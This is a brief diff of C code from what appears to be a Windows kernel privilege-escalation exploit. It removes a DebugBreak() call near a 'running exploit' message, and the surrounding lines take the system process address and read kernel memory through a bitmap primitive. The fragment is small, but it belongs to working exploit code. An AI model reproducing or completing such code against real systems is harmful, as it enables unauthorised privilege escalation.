@@ -357,10 +357,7 @@ main(
 	CloseHandle(dev);
 
 	DWORD64 _EP = GetPsInitialSystemProcess();
-	printf("\n[!] running exploit...\n\n\n");
-	DebugBreak();
-
-	
+	printf("\n[!] running exploit...\n\n\n");	
 
 	DWORD64 SepPtr = BitmapRead(
 		managerBitmap.hBmp,
